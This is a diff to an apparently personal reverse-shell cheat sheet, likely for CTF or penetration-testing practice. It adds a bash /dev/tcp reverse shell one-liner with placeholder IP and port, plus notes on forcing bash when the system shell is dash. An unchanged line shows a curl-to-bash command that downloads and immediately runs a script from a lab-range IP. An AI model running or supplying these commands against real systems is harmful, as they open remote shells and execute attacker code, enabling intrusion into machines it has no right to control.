@@ -4,7 +4,12 @@ https://www.revshells.com/
 
 ## Bash
 
+	bash -i >& /dev/tcp/<YOUR_IP>/<NETCAT_PORT> 0>&1
+
+	if the shell being used is dash and not bash (check by doing ls -la /bin/sh)
+
 	bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<NETCAT_PORT> 0>&1"
+	To use the bash's built-in /dev/tcp device file the use must use /bin/bash as shell. Often it uses sh or dash, then you can use bash -c "<cmd>" to force the bash
 
 ## PHP
 
@@ -33,3 +38,7 @@ Ugrading the the reverse shell we got
 Download reverse shell file and imediately execute it
 
 	curl 'http://10.10.16.20:2020/test.sh'|bash
+
+## Resources
+
+https://security-tips.vincd.com/reverse-shell/
